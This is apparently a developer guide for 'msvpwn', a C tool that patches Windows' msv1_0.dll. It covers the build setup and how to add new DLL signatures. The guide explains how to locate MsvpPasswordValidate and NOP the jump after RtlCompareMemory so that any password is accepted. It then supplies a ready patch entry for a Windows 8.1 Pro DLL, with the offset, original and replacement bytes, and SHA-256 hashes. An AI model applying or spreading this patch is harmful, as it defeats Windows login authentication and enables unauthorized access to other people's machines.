# Project layout

All the code is in `src`. In `doc`, you will find the Markdown source for the manpage, and the manpage itself. To edit the manpage, you'll need
[ronn] (`gem install ronn` for the lazy) and then you can run `make regen_man`. As a bonus, if you run `make html` from the project's root, you
will get an HTML version of the manpage. I provide the generated manpage so that `ronn` is not a build dependency, it is only for devs.

In `src`, you'll find the following files:

* argparsing.c/h: If you like boring argument parsing, you'll be delighted by this.
* errorhandling.h: Two error-reporting macros
* hashing.c/h: Hash the DLL (SHA-256)
* patch.c/.h: Actual DLL patching
* config.h: List of signatures and associated patches, *à la* dwm
* msvpwn.c: Main program

# Development setup

I prefer to use `clang`, as the error messages are *way* more helpful and clear. On my machine, I have `-Weverything` in my `CFLAGS`, `CC` set to `clang` (in the Makefile).
For portability reasons, we can't have this in the repo though. It is important to note that `-Weverything` is **paranoid** and activates **every** warning that exists in `clang`, so it's
perfectly normal to have a few. At the time I'm writing, there are only 6 warnings, all about padding in the `PatchInfo` structure. No warning should be ignored.

# Adding signatures

## Preliminary work

Should you find a DLL which is not recognized by `msvpwn`, you will need to decompile it using appropriate tools, such as IDA Pro. Load the debug
symbols from the Microsoft database, and locate the function `MsvpPasswordValidate`. In it, you should find stuff like this:

```nasm
mov esi, 10h
lea rdx, [rbp+50h]  ; Source2
mov rcx, rbx    ; Source1
mov r8, rsi     ; Length
call    cs:__imp_RtlCompareMemory
cmp rax, rsi
jnz bad_password
```

Here, we compare the password hash that is stored in the SAM database with the hash that has been computed of the password given by the user (in fact, the 10 first characters).
According to [MSDN's definition of RtlCompareMemory]:

```c
SIZE_T RtlCompareMemory(
_In_  const VOID *Source1,
_In_  const VOID *Source2,
_In_  SIZE_T Length
);
```

> RtlCompareMemory returns the number of bytes in the two blocks that match. If all bytes match up to the specified Length value, the Length value is returned.

Therefore, if `cmp rax, rsi` doesn't set the zero flag, the password is incorrect, and hence the `jnz` will take us to the "bad password" branch. If we NOP it, any password will
be seen as correct. So, patch the DLL. Then, you will need the pre-patch SHA256 hash of the DLL, and the binary diff.

## Actual addition

In `src/config.h`, you will find an array of PatchInfo structures, which are the patches associated to a given signature. Let's take a look at the actual definition of PatchInfo:

```c
struct PatchInfo
{
    unsigned int sig_number;
    const char* patchedsig[MAX_SIG_NUMBER];
    const char* unpatchedsig[MAX_SIG_NUMBER];
    unsigned int patch_offset;
    size_t patch_size;
    unsigned const char previous[MAX_SIZE];
    unsigned const char patch[MAX_SIZE];
};
```

There might be a few DLL versions which have the same patch but different SHA-256 hashes, hence the `sig_number` field. It is the number of signatures corresponding to this patch, starting from 1.
`unpatchedsig` is an array of signatures of DLLs which correspond to this patch, before the patch happens. `patchedsig` is its counterpart. Now, `patch_offset` is the patch's starting offset,
`patch_size` is self-explanatory. `previous` are the `size` bytes at `patch_offset` before the patch happens, and `patch` after the patch happens (`patch` will most probably be only NOPs).

As an example, someone sent me his DLL (Windows 8.1 Pro). I reversed it, and with IDA Pro, I generated a diff file:

```text
This difference file has been created by IDA Pro

msv1_0.dll
00012153: 0F 90
00012154: 85 90
00012155: 08 90
00012156: 9E 90
00012157: 00 90
00012158: 00 90
```

We have computed the two hashes, and we can now add this to the array:

```c
{.sig_number = 1,
 .unpatchedsig = {"06a28d229540f728c60dea5e9baba90cace94aa8190a6a12d71783b7fe226243"},
 .patchedsig = {"42acddd1ce9201808773242eaa011e87086e9a23aa9d2c612d9ef6dc47359415"},
 .patch_offset = 0x12153,
 .patch_size = 0x6,
 .previous = {0x0f, 0x85, 0x08, 0x9e, 0x00, 0x00},
 .patch = {0x90, 0x90, 0x90, 0x90, 0x90, 0x90}},
```

Note that we did this because there was no patch that fitted, but elsewise we would have incremented `sig_number`, and added the signatures to the `unpatchedsig` and `patchedsig` arrays.
Make sure you use designated inits, otherwise it would be a pain in the ass to read.

[ronn]: http://rtomayko.github.io/ronn/
[MSDN's definition of RtlCompareMemory]: http://msdn.microsoft.com/en-us/library/windows/hardware/ff561778(v=vs.85).aspx
